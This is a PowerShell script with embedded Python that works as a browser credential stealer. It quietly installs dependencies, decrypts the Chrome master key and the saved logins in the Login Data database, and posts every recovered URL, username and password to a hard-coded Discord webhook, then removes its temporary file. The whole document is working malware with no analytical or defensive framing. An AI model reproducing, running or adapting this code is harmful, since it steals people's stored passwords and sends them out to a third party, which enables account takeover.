$ErrorActionPreference = 'Stop'
$webhook = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"

# Check Python
try { python --version >$null 2>&1 } catch { 
    Write-Host "⚠️ Install Python first: https://python.org"
    exit 
}

# Install requirements
python -m pip install --upgrade pip >$null 2>&1
python -m pip install pycryptodome pypiwin32 requests >$null 2>&1

# Python script
$pythonCode = @'
import os, json, sqlite3, base64, win32crypt
from Crypto.Cipher import AES
import shutil, uuid

def decrypt(password, key):
    try:
        iv, password = password[3:15], password[15:]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def main():
    try:
        db_file = f"chrome_{uuid.uuid4().hex}.db"
        with open(os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Local State"),"r",encoding="utf-8") as f:
            key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
        
        shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","default","Login Data"), db_file)
        db = sqlite3.connect(db_file)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        results = []
        for row in cursor.fetchall():
            url, username, password = row
            decrypted = decrypt(password, key)
            if username or decrypted:
                results.append({
                    "url": url,
                    "username": username,
                    "password": decrypted
                })
        
        print(json.dumps(results))
    except Exception as e:
        print(json.dumps({"error": str(e)}))
    finally:
        try:
            cursor.close()
            db.close()
            os.remove(db_file)
        except:
            pass

if __name__ == "__main__":
    main()
'@

# Execute and send to Discord
$tempFile = "$env:TEMP\chrome_pass_$(Get-Random).py"
try {
    [System.IO.File]::WriteAllText($tempFile, $pythonCode)
    $results = python $tempFile 2>&1
    
    $payload = @{
        embeds = @(
            @{
                description = "```json`n$results`n```"
                color = if ($results -match '"error"') { 16711680 } else { 65280 }
            }
        )
    }
    
    Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json" >$null
}
finally {
    Remove-Item $tempFile -ErrorAction SilentlyContinue
}
